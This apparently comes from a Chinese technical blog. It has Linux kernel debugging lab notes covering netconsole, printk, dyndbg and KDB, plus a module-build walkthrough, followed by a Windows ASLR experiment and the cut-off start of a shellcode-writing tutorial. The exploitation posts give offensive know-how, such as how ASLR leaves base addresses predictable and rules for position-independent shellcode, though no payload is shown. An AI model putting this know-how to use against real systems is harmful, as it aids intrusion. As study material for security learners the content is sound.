<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line"><span class="meta prompt_"># </span><span class="language-bash">使用COM1连接，115,200比特率</span></span><br><span class="line">minicom -b 115200 -D /dev/ttyS0</span><br><span class="line"><span class="meta prompt_"></span></span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">USB串行端口连接</span></span><br><span class="line">minicom -D /dev/ttyUSB0</span><br><span class="line"><span class="meta prompt_"></span></span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">连接虚拟机的串行端口</span></span><br><span class="line">minicom -D /dev/pts/20</span><br></pre></td></tr></table></figure>

<h3 id="netconsole"><a href="#netconsole" class="headerlink" title="netconsole"></a>netconsole</h3><p><code>netconsole</code>是一个可以使用<strong>网络</strong>打印内核日志消息的工具，当磁盘日志系统无法工作、串行端口无法使用或终端没有回显时，使用<code>netconsole</code>很合适。<code>netconsole</code>本身以内核模块的形式存在。</p>
<p>工作时需要以下参数：</p>
<ul>
<li>端口@IP 地址&#x2F;调试站的源接口名称</li>
<li>端口@调试消息被发送到的机器的 IP 地址&#x2F;MAC 地址</li>
</ul>
<p>这些参数可以在模块被<strong>插入内核时</strong>进行配置，也可以在<strong>模块插入后</strong>进行配置（要求编译时开启了 <code>CONFIG_NETCONSOLE_DYNAMIC</code> 选项）。</p>
<p>将<code>netconsole</code>插入内核时的一个配置示例如下：</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">alice:~# modprobe netconsole netconsole=6666@192.168.191.130/eth0,6000@192.168.191.1/00:50:56:c0:00:08</span><br></pre></td></tr></table></figure>

<p>IP 地址为<code>192.168.191.130</code>的源机器上的调试信息，会经过<code>6666</code>端口上的<code>eth0</code>接口，发送到 IP 地址为<code>192.168.191.1</code> MAC 地址为<code>00:50:56:c0:00:08</code>的目标机器的<code>6000</code>端口。</p>
<p>在目标机器上可以使用<code>netcat</code>接收消息：</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">bob:~ # nc -l -p 6000 -u</span><br></pre></td></tr></table></figure>

<p>或者，目标机器上可以配置<code>syslogd</code>来拦截这些消息。更多信息可在<code>Documentation/networking/netconsole.txt</code>中找到。</p>
<h3 id="Printk-调试"><a href="#Printk-调试" class="headerlink" title="Printk 调试"></a>Printk 调试</h3><blockquote>
<p>两个最经典、最有用的调试工具是你的大脑和 Printf。</p>
</blockquote>
<p>对于调试，大家经常使用一种原始但非常高效的方式：<code>printk</code>调试。尽管可以使用调试器，但它通常不是很有用：简单的<code>bug</code>（比如未初始化的变量，内存管理问题等）可以通过控制消息打印或观察解码后的内核<code>oops</code>信息快速定位。</p>
<p>对于更复杂的<code>bug</code>，即便是调试器也没办法给予我们太多帮助，除非操作系统的结构非常好理解。当调试内核模块时，存在很多位置的因素：多个上下文（同一时刻系统里运行着多个进程和线程），中断，虚拟内存等等。</p>
<p>你可以使用<code>printk</code>把内核消息展示到用户空间。它和<code>printf</code>的功能相似，唯一的区别是，传输的消息可以以字符串”<code>&lt;n&gt;</code>“为前缀，其中<code>n</code>表示错误级别（日志级别），值的范围是<code>0-7</code>。如果不使用”<code>&lt;n&gt;</code>“，也可以使用一些符号常量表示日志级别，对应关系如下：</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">n = 0	KERN_EMERG</span><br><span class="line">n = 1	KERN_ALERT</span><br><span class="line">n = 2	KERN_CRIT</span><br><span class="line">n = 3	KERN_ERR</span><br><span class="line">n = 4	KERN_WARNING</span><br><span class="line">n = 5	KERN_NOTICE</span><br><span class="line">n = 6	KERN_INFO</span><br><span class="line">n = 7	KERN_DEBUG</span><br></pre></td></tr></table></figure>

<p>关于所有日志级别的定义，可以在<code>linux/kern_levels.h</code>文件中找到。基本上，这些级别主要用于告诉系统要把消息发送到哪里：终端，日志文件，或者 <code>/var/log</code> 等等。</p>
<blockquote>
<p>Note.</p>
<p>为了在用户空间展示<code>printk</code>消息，消息的日志级别必须比<code>console_loglevel </code>的级别要高（数值要小）。默认的终端日志级别可以在<code>/proc/sys/kernel/printk</code>进行配置。</p>
<p>比如，</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line"><span class="meta prompt_">&gt;</span><span class="language-bash"><span class="built_in">echo</span> 8 &gt; /proc/sys/kernel/printk</span></span><br></pre></td></tr></table></figure>

<p>以上命令将使得所有内核日志消息都能够在终端中展示。也就是说，日志记录级别必须严格小于<code>console_loglevel</code>变量。例如，如果<code>console_loglevel</code>的值为 5（<code>KERN_NOTICE</code>），则只显示<code>loglevel&lt;=5</code>的消息（即KERN_EMERG、KERN_ALERT、KERN_CRIT、KERN_ERR、KERN_WARNING）。</p>
</blockquote>
<p>控制台重定向消息对于快速查看执行内核代码的效果非常有用，但如果内核遇到无法修复的错误并且系统冻结，它们就不再那么有用了。</p>
<p>在这种情况下，必须查阅系统的日志，因为它们在系统重新启动之间保留信息。这些文件位于<code>/var/log</code>中，是文本文件，在内核运行期间由<code>syslogd</code>和<code>klogd</code>填充。<code>syslogd</code>和<code>klogd</code>从装载的<code>/proc</code>虚拟文件系统中获取信息。原则上，打开<code>syslogd</code>和<code>klogd</code>后，所有来自内核的消息都将转到<code>/var/log/kern.log</code>。</p>
<p>一个更简单的调试方法是使用<code>/var/log/debug</code>文件。它只由来自内核的具有<code>KERN_DEBUG</code>日志级别的printk消息填充。</p>
<p>考虑到生产内核（类似于我们可能正在运行的内核）只包含<strong>发布代码</strong>，我们的模块是少数几个发送以<code>KERN DEBUG</code>为前缀的消息的模块之一。通过这种方式，我们可以通过查找与模块的调试会话相对应的消息，轻松地浏览<code>/var/log/debug</code>信息。</p>
<p>示例如下：</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line"><span class="meta prompt_"># </span><span class="language-bash">Clear the debug file of previous information (or possibly a backup)</span></span><br><span class="line"><span class="meta prompt_">$ </span><span class="language-bash"><span class="built_in">echo</span> <span class="string">&quot;New debug session&quot;</span> &gt; /var/log/debug</span></span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">Run the tests</span></span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">If there is no critical error causing a panic kernel, check the output</span></span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash"><span class="keyword">if</span> a critical error occurs and the machine only responds to a restart,</span></span><br><span class="line">  restart the system and check /var/log/debug.</span><br></pre></td></tr></table></figure>

<p>为了检测错误，打印出的消息应当尽量包含所有感兴趣的信息，但在代码中插入<code>printk</code>可能与编写解决问题的代码一样耗时。因此通常需要是调试消息完整性和将这些消息插入代码所需时间之间进行权衡。</p>
<p>可以使用预定义的常量<code>__FILE__</code>, <code>__LINE__</code> and <code>__func__</code>来提高插入<code>printk</code>语句的效率：</p>
<ul>
<li><p><code>__FILE__</code>被编译器替换为<strong>源文件</strong>的名称</p>
</li>
<li><p><code>__LINE__</code>被编译器替换为当前指令对应的源文件中代码的<strong>行号</strong></p>
</li>
<li><p><code>__func__/__FUNCTION__</code>被编译器替换为当前指令<strong>所在函数</strong>的名称</p>
</li>
</ul>
<blockquote>
<p>Note.</p>
<p><code>__FILE__</code>和<code>__LINE__</code>是<code>ANSI C</code>规范的一部分：<code>__func_</code>是<code>C99</code>规范的一部分；<code>__FUNCTION __</code>是一个<code>GNU C</code>扩展，不可移植；不过，由于我们为<code>Linux</code>内核编写代码，因此可以毫无问题地使用它们。</p>
</blockquote>
<p>下面的<strong>宏定义</strong>可以在这样的情况下使用：</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line"><span class="meta prompt_">#</span><span class="language-bash">define PRINT_DEBUG \</span></span><br><span class="line"><span class="language-bash">       printk (KERN_DEBUG <span class="string">&quot;[% s]: FUNC:% s: LINE:% d \ n&quot;</span>, __FILE__,</span></span><br><span class="line">               __FUNCTION__, __LINE__)</span><br></pre></td></tr></table></figure>

<p>之后，在每个我们想要观察是否执行到的位置，插入<code>PRINT_DEBUG</code>即可。这是一个简单快速的方式，且可以用于仔细的分系。</p>
<p><code>dmesg</code>命令被用来观察使用<code>printk</code>打印，但未在终端输出的消息。</p>
<p>运行以下命令，可以删除日志文件中之前的消息：</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">cat /dev/null &gt; /var/log/debug</span><br></pre></td></tr></table></figure>

<p>运行以下命令，可以删除当前能被<code>dmesg</code>输出的消息：</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">dmesg -c</span><br></pre></td></tr></table></figure>

<h3 id="dyndbg-动态调试"><a href="#dyndbg-动态调试" class="headerlink" title="dyndbg 动态调试"></a>dyndbg 动态调试</h3><p>动态调试能够显著地减少要输出的消息的数量。为了使用动态调试函数，编译内核时要开启<code>CONFIG_DYNAMIC_DEBUG</code>选项，之后就可以使用<code>pr_debug()</code>, <code>dev_dbg()</code>, <code>print_hex_dump_debug()</code>, <code>print_hex_dump_bytes()</code>等函数。</p>
<p>当<code>debugfs</code>被挂载到<code>/sys/kernel/debug</code>时，<code>/sys/kernel/debug/dynamic_debug/control</code>文件用于过滤消息，也可以通过它查看已经存在的过滤器。</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">mount -t debugfs none /debug</span><br></pre></td></tr></table></figure>

<p><code>Debugfs</code>是一个简单的文件系统，用作内核空间接口和用户空间接口来配置不同的调试选项。任何调试工具都可以在<code>debugfs</code>中创建和使用自己的文件&#x2F;文件夹。</p>
<p>比如，为了展示动态调试（dyndbg）中已经存在的过滤器，可以使用：</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">cat /debug/dynamic_debug/control</span><br></pre></td></tr></table></figure>

<p>如郭想要接收<code>svsock.c</code>文件的第<strong>1603</strong>行输出的调试消息，可以使用以下命令进行设置：</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">echo &#x27;file svcsock.c line 1603 +p&#x27; &gt; /debug/dynamic_debug/control</span><br></pre></td></tr></table></figure>

<h4 id="动态调试选项"><a href="#动态调试选项" class="headerlink" title="动态调试选项"></a>动态调试选项</h4><ul>
<li><p>func - 根据所在函数的函数名过滤消息</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">echo &#x27;func svc_tcp_accept +p&#x27; &gt; /debug/dynamic_debug/control</span><br></pre></td></tr></table></figure>
</li>
<li><p>file - 根据源文件名过滤消息，可以使用绝对路径和相对路径，以及内核树路径</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">file svcsock.c</span><br><span class="line">file kernel/freezer.c</span><br><span class="line">file /usr/src/packages/BUILD/sgi-enhancednfs-1.4/default/net/sunrpc/svcsock.c</span><br></pre></td></tr></table></figure>
</li>
<li><p>module - 根据模块名过滤消息</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">module sunrpc</span><br></pre></td></tr></table></figure>
</li>
<li><p>format - 只显示包含以下字符串的消息</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">format &quot;nfsd: SETATTR&quot;</span><br></pre></td></tr></table></figure>
</li>
<li><p>line - 根据行号启用调试函数</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line"><span class="meta prompt_"># </span><span class="language-bash">Triggers debug messages between lines 1603 and 1605 <span class="keyword">in</span> the svcsock.c file</span></span><br><span class="line"><span class="meta prompt_">$ </span><span class="language-bash"><span class="built_in">echo</span> <span class="string">&#x27;file svcsock.c line 1603-1605 +p&#x27;</span> &gt; /sys/kernel/debug/dynamic_debug/control</span></span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">Enables debug messages from the beginning of the file to line 1605</span></span><br><span class="line"><span class="meta prompt_">$ </span><span class="language-bash"><span class="built_in">echo</span> <span class="string">&#x27;file svcsock.c line -1605 +p&#x27;</span> &gt; /sys/kernel/debug/dynamic_debug/control</span></span><br></pre></td></tr></table></figure></li>
</ul>
<p>除了以上选项，还可以使用操作符（<code>+</code> <code> -</code> <code> =</code>）添加、删除或设置一系列<code>flags</code></p>
<ul>
<li>p  激活<code>pr_debug()</code></li>
<li>f 在输出消息中包含函数名</li>
<li>l 在输出消息中包含行号</li>
<li>m 在输出消息中包含模块名</li>
<li>t 在输出消息中包含线程 id ，如果不是从中断上下文中调用的话</li>
<li>_ 不设置任何标志</li>
</ul>
<h3 id="KDB内核调试器"><a href="#KDB内核调试器" class="headerlink" title="KDB内核调试器"></a>KDB内核调试器</h3><p>内核调试器已被证明对促进开发和调试过程非常有用。它的主要优点之一是可以执行实时调试。这使我们能够实时监控对内存的访问，甚至在调试时修改内存。从<code>2.6.26-rci</code>版本开始，调试器已经集成在主流内核中。KDB不是源调试器，但要进行完整的分析，它可以并行使用<code>gdb</code>和符号文件——请参阅<a href="https://linux-kernel-labs.github.io/refs/heads/master/so2/lab1-intro.html#gdb-intro">gdb调试部分</a></p>
<p>要使用<code>KDB</code>，有以下选项：</p>
<ul>
<li><p>非<code>usb</code>键盘+<code>VGA</code>文本控制台</p>
</li>
<li><p>串行端口控制台</p>
</li>
<li><p><code>USB EHCI</code>调试端口</p>
</li>
</ul>
<p>对于本实验，我们将使用连接到主机的串行接口。以下命令将通过串行端口激活GDB：</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">echo hvc0 &gt; /sys/module/kgdboc/parameters/kgdboc</span><br></pre></td></tr></table></figure>

<p><code>KDB</code>是一个<code>stop</code>模式调试器，这意味着当它处于活动状态时，所有其他进程都会停止。在执行过程中，可以使用以下<code>Sys Rq</code>命令强制内核进入<code>KDB</code></p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">echo g &gt; /proc/sysrq-trigger</span><br></pre></td></tr></table></figure>

<p>或者通过在连接到串行端口（例如使用minicom）的终端中使用组合键<code>Ctrl+O g</code>。</p>
<p>KDB有各种命令来控制和定义被调试系统的上下文：</p>
<ul>
<li><p>lsmod、ps、kill、dmesg、env、bt（backtrace，回溯）</p>
</li>
<li><p>转储跟踪日志</p>
</li>
<li><p>硬件断点</p>
</li>
<li><p>修改内存</p>
</li>
</ul>
<p>为了更好地描述可用的命令，可以使用<code>KDBshell</code>中的<code>help</code>命令。在下一个示例中，您可以注意到一个简单的<code>KDB</code>使用示例，它设置了一个硬件断点来监视<code>mVar</code>变量的更改</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line"><span class="meta prompt_"># </span><span class="language-bash">trigger KDB</span></span><br><span class="line">echo g &gt; /proc/sysrq-trigger</span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">or <span class="keyword">if</span> we are connected to the serial port issue</span></span><br><span class="line">Ctrl-O g</span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">breakpoint on write access to the mVar variable</span></span><br><span class="line"><span class="meta prompt_">kdb&gt; </span><span class="language-bash">bph mVar dataw</span></span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash"><span class="built_in">return</span> from KDB</span></span><br><span class="line"><span class="meta prompt_">kdb&gt; </span><span class="language-bash">go</span></span><br></pre></td></tr></table></figure>

<blockquote>
<p>Note.</p>
<p>如果你想学习如何轻松浏览Linux源代码以及如何调试内核代码，请阅读“<a href="https://linux-kernel-labs.github.io/refs/heads/master/so2/lab1-intro.html#good-to-know">Good to know</a> ”部分。</p>
</blockquote>
<h1 id="练习"><a href="#练习" class="headerlink" title="练习"></a>练习</h1><h3 id="基本准备"><a href="#基本准备" class="headerlink" title="基本准备"></a>基本准备</h3><p>下载内核源码</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">cd ~</span><br><span class="line">curl -O -L https://mirrors.tuna.tsinghua.edu.cn/kernel/v5.x/linux-5.4.98.tar.xz</span><br><span class="line">unxz linux-5.4.98.tar.xz</span><br><span class="line">tar -xf linux-5.4.98.tar</span><br></pre></td></tr></table></figure>

<p>配置编译选项，</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">make menuconfig</span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">依次进入到 Kernel hacking -&gt; Compile-time checks and compiler options，然后勾选如下选项Compile the kernel with debug info，以便于调试</span></span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">如果要使用 kgdb 调试内核，则需要选中 KGDB: kernel debugger，并选中 KGDB 下的所有选项。</span></span><br></pre></td></tr></table></figure>

<p>根据配置准备必要文件</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">make prepare</span><br></pre></td></tr></table></figure>

<p>创建内核模块实验目录</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">mkdir linuxkm</span><br><span class="line">code linuxkm  # 使用vscode</span><br></pre></td></tr></table></figure>

<p>设置vscode 头文件目录，添加以下三个路径，如果头文件仍然显示错误，建议禁用错误波形曲线</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">~/linux-5.4.98/include/**</span><br><span class="line">~/linux-5.4.98/arch/x86/include/**</span><br><span class="line">&quot;~/linux-5.4.98/arch/x86/include/generated/**&quot;</span><br></pre></td></tr></table></figure>

<p>Makefile</p>
<figure class="highlight makefile"><table><tr><td class="code"><pre><span class="line">KDIR =  ~/linux-5.4.98/</span><br><span class="line"></span><br><span class="line"><span class="section">kbuild:</span></span><br><span class="line">	make -C <span class="variable">$(KDIR)</span> M=`pwd`</span><br><span class="line"></span><br><span class="line"><span class="section">clean:</span></span><br><span class="line">	make -C <span class="variable">$(KDIR)</span> M=`pwd` clean</span><br><span class="line"></span><br><span class="line"><span class="meta"><span class="keyword">.PHONY</span>: kbuild clean</span></span><br></pre></td></tr></table></figure>

<p>Kbuild</p>
<figure class="highlight makefile"><table><tr><td class="code"><pre><span class="line">EXTRA_CFLAGS = -Wall -g</span><br><span class="line"></span><br><span class="line">obj-m        = modul.o</span><br></pre></td></tr></table></figure>

<p>modul.c</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;linux/kernel.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;linux/init.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;linux/module.h&gt;</span></span></span><br><span class="line"></span><br><span class="line">MODULE_DESCRIPTION(<span class="string">&quot;My kernel module&quot;</span>);</span><br><span class="line">MODULE_AUTHOR(<span class="string">&quot;Me&quot;</span>);</span><br><span class="line">MODULE_LICENSE(<span class="string">&quot;GPL&quot;</span>);</span><br><span class="line"></span><br><span class="line"><span class="type">static</span> <span class="type">int</span> <span class="title function_">dummy_init</span><span class="params">(<span class="type">void</span>)</span></span><br><span class="line">&#123;</span><br><span class="line">        printk(<span class="string">&quot;Hi\n&quot;</span>);</span><br><span class="line">        <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">static</span> <span class="type">void</span> <span class="title function_">dummy_exit</span><span class="params">(<span class="type">void</span>)</span></span><br><span class="line">&#123;</span><br><span class="line">        printk(<span class="string">&quot;Bye\n&quot;</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">module_init(dummy_init);</span><br><span class="line">module_exit(dummy_exit);</span><br></pre></td></tr></table></figure>

<p>执行make命令，输出以下内容则编译成功</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line"><span class="meta prompt_">~/linuxkm$ </span><span class="language-bash">make</span></span><br><span class="line">make -C ~/linux-5.4.98/ M=`pwd`</span><br><span class="line">make[1]: Entering directory &#x27;/home/czx/linux-5.4.98&#x27;</span><br><span class="line">  CC [M]  /mnt/d/Users/czx/NativeFiles/Desktop/PWN/linuxkm/modul.o</span><br><span class="line"></span><br><span class="line">  WARNING: Symbol version dump ./Module.symvers</span><br><span class="line">           is missing; modules will have no dependencies and modversions.</span><br><span class="line"></span><br><span class="line">  Building modules, stage 2.</span><br><span class="line">  MODPOST 1 modules</span><br><span class="line">  CC [M]  /mnt/d/Users/czx/NativeFiles/Desktop/PWN/linuxkm/modul.mod.o</span><br><span class="line">  LD [M]  /mnt/d/Users/czx/NativeFiles/Desktop/PWN/linuxkm/modul.ko</span><br><span class="line">make[1]: Leaving directory &#x27;/home/czx/linux-5.4.98&#x27;</span><br></pre></td></tr></table></figure>

<h3 id="启动虚拟机"><a href="#启动虚拟机" class="headerlink" title="启动虚拟机"></a>启动虚拟机</h3><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line"></span><br></pre></td></tr></table></figure>

<p>执行 make boot</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line"><span class="meta prompt_">tools/labs$ </span><span class="language-bash">make boot</span></span><br><span class="line">qemu/create_net.sh lkt-tap0</span><br><span class="line">qemu/create_net.sh lkt-tap1</span><br><span class="line">/home/czx/linux-kernel-labs/tools/labs/templates/assignments/6-e100/nttcp -v -i &amp;</span><br><span class="line">nttcp-l: nttcp, version 1.47</span><br><span class="line">nttcp-l: running in inetd mode on port 5037 - ignoring options beside -v and -p</span><br><span class="line">bind: Address already in use</span><br><span class="line">nttcp-l: service-socket: bind:: Address already in use, errno=98</span><br><span class="line">ARCH=x86 qemu/qemu.sh -kernel /home/czx/linux-kernel-labs/arch/x86/boot/bzImage -device virtio-serial -chardev pty,id=virtiocon0 -device virtconsole,chardev=virtiocon0 -serial pipe:pipe1 -serial pipe:pipe2 -netdev tap,id=lkt-tap0,ifname=lkt-tap0,script=no,downscript=no -net nic,netdev=lkt-tap0,model=virtio -netdev tap,id=lkt-tap1,ifname=lkt-tap1,script=no,downscript=no -net nic,netdev=lkt-tap1,model=i82559er -drive file=core-image-minimal-qemux86.ext4,if=virtio,format=raw -drive file=disk1.img,if=virtio,format=raw -drive file=disk2.img,if=virtio,format=raw --append &quot;root=/dev/vda loglevel=15 console=hvc0 pci=noacpi&quot; --display none -s -m 256</span><br><span class="line">char device redirected to /dev/pts/9 (label virtiocon0)</span><br></pre></td></tr></table></figure>

<p>使用 minicom 登录qemu，注意 -D 后的设备号与上面输出的最后一行保持一致，进入时输入root，即获得shell界面</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">minicom -D /dev/pts/9</span><br><span class="line">或</span><br><span class="line">minicom -D serial.pts</span><br></pre></td></tr></table></figure>

<h3 id="内核模块"><a href="#内核模块" class="headerlink" title="内核模块"></a>内核模块</h3><h3 id="Printk"><a href="#Printk" class="headerlink" title="Printk"></a>Printk</h3><h3 id="Error"><a href="#Error" class="headerlink" title="Error"></a>Error</h3><h3 id="Sub-modules"><a href="#Sub-modules" class="headerlink" title="Sub-modules"></a>Sub-modules</h3><h3 id="Kernel-oops"><a href="#Kernel-oops" class="headerlink" title="Kernel oops"></a>Kernel oops</h3><h3 id="Module-parameters"><a href="#Module-parameters" class="headerlink" title="Module parameters"></a>Module parameters</h3><h3 id="proc-info"><a href="#proc-info" class="headerlink" title="proc info"></a>proc info</h3>]]></content>
      <categories>
        <category>linux-kernel-labs</category>
      </categories>
  </entry>
  <entry>
    <title>winsock practice</title>
    <url>/2023/10/19/LearningNotes/winsock-practice/</url>
    <content><![CDATA[]]></content>
  </entry>
  <entry>
    <title>ASLR in Windows</title>
    <url>/2023/10/22/Windwos-PWN/ASLR-in-Windows/</url>
    <content><![CDATA[<p>众所周知，<code>ASLR</code>会使得<code>PE</code>文件的加载基址随机化，但有时候我们还是能够利用固定的地址，指向<code>kernel32.dll ntdll.dll</code>等<code>dll</code>文件中的特定指令，这是为什么呢？</p>
<p>参考资料：</p>
<ul>
<li><p><a href="https://blog.csdn.net/weixin_43742894/article/details/105879904">ntdll 的内存加载位置</a></p>
</li>
<li><p><a href="http://www.nynaeve.net/?p=198">Why are certain DLLs required to be at the same base address system-wide? « Nynaeve</a></p>
</li>
</ul>
<span id="more"></span>

<h2 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h2><p><code>Windows</code>和<code>Linux</code>下的<code>ASLR</code>区别很大。</p>
<p>在<code>Linux</code>下，<code>ASLR</code>的实现分为两个部分</p>
<ul>
<li>系统部分，根据<code>/proc/sys/kernel/randomize_va_space</code>中设置的等级，影响 <code>栈、库、mmap、堆</code>（stack .so mmap heap）基址的随机性。</li>
<li>编译器部分，由<code>PIE</code>选项决定编译得到程序是否是地址无关的，如果是，程序加载基址和全局数据地址（.text .data .bss）就可以随机化。</li>
</ul>
<p>在<code>Windwos</code>下，<code>ASLR</code>可由 <code>Visual Studio</code> 下的一个链接器选项——随机基址（<code>/DYNAMICBASE</code>）控制。</p>
<h2 id="开始实验"><a href="#开始实验" class="headerlink" title="开始实验"></a>开始实验</h2><h3 id="ASLR与程序基址的关系"><a href="#ASLR与程序基址的关系" class="headerlink" title="ASLR与程序基址的关系"></a>ASLR与程序基址的关系</h3><h4 id="开启ASLR"><a href="#开启ASLR" class="headerlink" title="开启ASLR"></a>开启ASLR</h4><p>使用visual studio生成一个可执行程序<code>Exploime.exe</code>，开启随机基址</p>
<p><img src="/../pic/ASLR-in-Windows/ASLR-YES.png" alt="ASLR open"></p>
<p>使用windbg加载<code>Exploime.exe</code>，然后使用<code>lm</code>命令查看已加载模块的基址</p>
<p><img src="/../pic/ASLR-in-Windows/pic1.png" alt="pic1"></p>
<p>重启windbg，重复上面操作</p>
<p><img src="/../pic/ASLR-in-Windows/pic2.png" alt="pic2"></p>
<p>发现，和之前一样。</p>
<p>重启电脑，再来一次，得到</p>
<p><img src="/../pic/ASLR-in-Windows/pic3.png" alt="pic3"></p>
<p>发现各个基址出现变化。</p>
<h4 id="关闭ASLR"><a href="#关闭ASLR" class="headerlink" title="关闭ASLR"></a>关闭ASLR</h4><p>关闭随机基址，重新生成<code>Exploime.exe</code></p>
<p><img src="/../pic/ASLR-in-Windows/ASLR-NO.png" alt="ASLR open"></p>
<p>使用windbg加载<code>Exploime.exe</code>，然后使用<code>lm</code>命令查看已加载模块的基址</p>
<p><img src="/../pic/ASLR-in-Windows/pic4.png" alt="pic4"></p>
<p>重启windbg，重复上面操作</p>
<p><img src="/../pic/ASLR-in-Windows/pic5.png" alt="pic5"></p>
<p>和上面一致，重启电脑，再来一次，得到</p>
<p><img src="/../pic/ASLR-in-Windows/pic6.png" alt="pic6"></p>
<p>发现关闭了<code>ASLR</code>的模块（<code>Exploitme</code>）基址没有变化，其余默认开启了<code>ASLR</code>的系统模块基址发生了变化。</p>
<h3 id="ASLR与堆栈基址的关系"><a href="#ASLR与堆栈基址的关系" class="headerlink" title="ASLR与堆栈基址的关系"></a>ASLR与堆栈基址的关系</h3><h4 id="开启ASLR-1"><a href="#开启ASLR-1" class="headerlink" title="开启ASLR"></a>开启ASLR</h4><p>开启<code>ASLR</code>后，可以看出两次运行堆栈地址的变化：</p>
<p><img src="/../pic/ASLR-in-Windows/address_aslr_1.png" alt="address_aslr_1"></p>
<p><img src="/../pic/ASLR-in-Windows/address_aslr_2.png" alt="address_aslr_2"></p>
<h4 id="关闭ASLR-1"><a href="#关闭ASLR-1" class="headerlink" title="关闭ASLR"></a>关闭ASLR</h4><p>未开启<code>ASLR</code>时，两次运行程序，查看堆栈地址结果如下，完全一致，不过可以看出其他模块的ASLR还是发挥了作用的：</p>
<p><img src="/../pic/ASLR-in-Windows/address1.png" alt="address1"></p>
<p><img src="/../pic/ASLR-in-Windows/address2.png" alt="address2"></p>
<h3 id="静态比较"><a href="#静态比较" class="headerlink" title="静态比较"></a>静态比较</h3><p>使用<code>Lord PE</code>查看开启<code>ASLR</code>与不开启<code>ASLR</code>程序节的区别，发现前者比后者多一个<code>.reloc</code>节，用于存储重定位信息。</p>
<p><img src="/../pic/ASLR-in-Windows/sections_aslr.png" alt="sections_aslr"></p>
<p><img src="/../pic/ASLR-in-Windows/section_noaslr.png" alt="section_noaslr"></p>
<h2 id="结论"><a href="#结论" class="headerlink" title="结论"></a>结论</h2><h3 id="ASLR与程序基址之间的关系"><a href="#ASLR与程序基址之间的关系" class="headerlink" title="ASLR与程序基址之间的关系"></a>ASLR与程序基址之间的关系</h3><p>Windows（至少Win10）下的<code>ASLR</code>机制，对程序基址的影响，只在系统启动时发挥作用，系统运行过程中，各个模块的基址不会变化。</p>
<p>（和我预想中不太一样，本来以为只有特定的dll是这样，但是上面可以看到一个普通的可执行程序<code>Exploitme</code>也是这样）。</p>
<h3 id="ASLR与堆栈基址之间的关系"><a href="#ASLR与堆栈基址之间的关系" class="headerlink" title="ASLR与堆栈基址之间的关系"></a>ASLR与堆栈基址之间的关系</h3><p>Windows（至少Win10）下，开启<code>ASLR</code>后，程序的堆栈基址每次运行时都是随机的。</p>
]]></content>
      <categories>
        <category>Windows-PWN</category>
      </categories>
  </entry>
  <entry>
    <title>Create Shellcode in Windows</title>
    <url>/2023/10/20/Windwos-PWN/Create-Shellcode-in-Windows/</url>
    <content><![CDATA[<p>讲解windwos下开发位置无关shellcode的基础知识，并构建框架代码和提取脚本。</p>
<p>参考链接：</p>
<ul>
<li><a href="https://tttang.com/archive/901/">Exploit开发系列教程-Windows基础&amp;shellcode)</a></li>
</ul>
<span id="more"></span>

<h2 id="理论准备"><a href="#理论准备" class="headerlink" title="理论准备"></a>理论准备</h2><p>一个好的<code>shellcode</code>，应该满足以下几个条件：</p>
<ul>
<li><p>不包含“<code>\X00</code>“：避免<code>shellcode</code>被截断</p>
</li>
<li><p>不能直接调用Windows API，而应该从<code>Windows</code>的数据结构体中寻找需要的函数。</p>
</li>
<li><p>自包含：仅使用栈变量</p>
<p>错误写法：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">char *v = char[100];</span><br><span class="line">char v[] = &quot;hello world&quot;; # 存储在.rdata节</span><br><span class="line">char *v = &quot;hello world&quot;; # 存储在.data节</span><br></pre></td></tr></table></figure>

<p>正确写法：</p>
